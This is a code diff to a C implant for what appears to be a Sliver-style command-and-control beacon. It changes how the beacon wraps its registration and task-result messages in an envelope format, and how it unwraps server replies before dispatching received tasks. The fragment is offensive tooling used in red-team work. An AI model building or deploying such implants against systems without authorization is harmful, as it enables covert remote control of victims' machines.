@@ -259,12 +259,16 @@ int sliver_beacon_run(const char *argv0) {
   /* 1) Register once. */
   err[0] = '\0';
   if (beacon_connect(&cfg, &conn, err, sizeof(err)) == 0) {
-    sliver_buf_t env;
+    sliver_buf_t payload, env;
+    sliver_buf_init(&payload);
     sliver_buf_init(&env);
-    if (sliver_beacon_register_encode(&env, id, interval_ns, jitter_ns, &cfg.reg,
-                                      next_checkin) == 0) {
+    if (sliver_beacon_register_encode(&payload, id, interval_ns, jitter_ns, &cfg.reg,
+                                      next_checkin) == 0 &&
+        sliver_envelope_encode(&env, 0, SLIVER_MSG_BEACON_REGISTER, payload.data,
+                               payload.len) == 0) {
       (void)beacon_send(&conn, env.data, env.len);
     }
+    sliver_buf_free(&payload);
     sliver_buf_free(&env);
     beacon_disconnect(&conn);
     LOG_INFO("beacon: registered (%s)", id);
@@ -286,13 +290,14 @@ int sliver_beacon_run(const char *argv0) {
 
     /* Send BeaconTasks carrying any pending results. */
     {
-      sliver_buf_t env;
+      sliver_buf_t payload, env;
+      sliver_buf_init(&payload);
       sliver_buf_init(&env);
       if (g_pending.count == 0) {
-        (void)sliver_beacon_tasks_encode(&env, id, next_checkin, NULL, 0);
+        (void)sliver_beacon_tasks_encode(&payload, id, next_checkin, NULL, 0);
       } else {
         sliver_mutex_lock(g_pending.lock);
-        if (sliver_beacon_tasks_encode(&env, id, next_checkin,
+        if (sliver_beacon_tasks_encode(&payload, id, next_checkin,
                                        (const sliver_buf_t *const *)g_pending.env,
                                        g_pending.count) == 0) {
           /* results have been sent: drop them from the queue */
@@ -304,26 +309,33 @@ int sliver_beacon_run(const char *argv0) {
         }
         sliver_mutex_unlock(g_pending.lock);
       }
-      if (env.len != 0) {
+      if (payload.len != 0 &&
+          sliver_envelope_encode(&env, 0, SLIVER_MSG_BEACON_TASKS, payload.data,
+                                 payload.len) == 0) {
         (void)beacon_send(&conn, env.data, env.len);
       }
+      sliver_buf_free(&payload);
       sliver_buf_free(&env);
     }
 
     /* With no pending results, the server may return tasks. */
     if (g_pending.count == 0) {
       sliver_buf_t reply;
+      sliver_envelope_t env_resp;
       sliver_buf_init(&reply);
       if (beacon_recv(&conn, cfg.server_minisign_pubkey, &reply) == 0 && reply.len != 0) {
-        char bid[128];
-        int64_t nc = 0;
-        sliver_envelope_t tasks[BEACON_MAX_PENDING];
-        size_t task_count = 0;
-        if (sliver_beacon_tasks_decode(reply.data, reply.len, bid, sizeof(bid), &nc, tasks,
-                                       sizeof(tasks) / sizeof(tasks[0]), &task_count) == 0) {
-          LOG_DEBUG("beacon: %u task(s)", (unsigned)task_count);
-          for (size_t i = 0; i < task_count; ++i) {
-            beacon_dispatch_task(&tasks[i]);
+        if (sliver_envelope_decode(reply.data, reply.len, &env_resp) == 0) {
+          char bid[128];
+          int64_t nc = 0;
+          sliver_envelope_t tasks[BEACON_MAX_PENDING];
+          size_t task_count = 0;
+          if (sliver_beacon_tasks_decode(env_resp.data, env_resp.data_len, bid, sizeof(bid), &nc,
+                                         tasks, sizeof(tasks) / sizeof(tasks[0]),
+                                         &task_count) == 0) {
+            LOG_DEBUG("beacon: %u task(s)", (unsigned)task_count);
+            for (size_t i = 0; i < task_count; ++i) {
+              beacon_dispatch_task(&tasks[i]);
+            }
           }
         }
       }
